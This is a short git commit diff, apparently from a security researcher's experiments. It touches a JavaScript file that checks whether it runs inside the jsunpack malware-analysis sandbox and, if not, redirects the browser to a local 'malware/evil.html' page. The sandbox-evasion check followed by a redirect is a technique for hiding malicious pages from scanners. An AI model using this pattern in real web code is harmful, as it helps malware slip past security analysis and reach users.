d33cef49e1f2f2f56403d3aa93495e93c8ad699a
Krzysztof Kotowicz <kkotowicz@gmail.com>
2010-06-09 13:20:59 +0200

    - simplified evil attack

--- js.js
+++ js.js
@@ -1,7 +1,7 @@
 // jsunpack detection
 // @author Krzysztof kotowicz - krzysztof at kotowicz dot net
 fake_browser = false;
-// fake_browser = (window.open.toString().match(/print/));
+//fake_browser = (window.open.toString().match(/print/));
 if (!fake_browser) {
    window.location = 'http://localhost/~koto/malware/evil.html';
 }
